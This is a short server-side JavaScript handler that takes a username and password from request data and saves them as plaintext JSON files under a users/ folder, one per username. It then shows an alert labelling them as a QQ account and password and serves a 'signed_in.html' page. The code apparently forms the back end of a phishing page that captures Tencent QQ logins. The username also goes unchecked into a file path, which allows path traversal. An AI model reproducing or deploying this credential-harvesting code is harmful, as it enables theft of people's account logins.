try{
    var dic = JSON.parse( Response.getURLData() );
    var username=dic["u"];
    var password=dic["p"];
    try    {
        var file = File.newFile( File.getWebsitePath()+"/users/"+username );
        if(!file.exists())        	file.createFile( true );
        file.write( "{\"username\":\""+username+"\",\"password\":\""+password+"\"}" );
    }
    catch(e)    {
        alert( e.toString() );
    }
    alert("QQ号码/手机/邮箱："+username+"\nQQ密码："+password);
    var html=File.newFile( File.getWebsitePath()+"/signed_in.html" ).read();
    Response.setHTML( html , "UTF-8" );
}
catch(e){
    alert(e.toString());
}
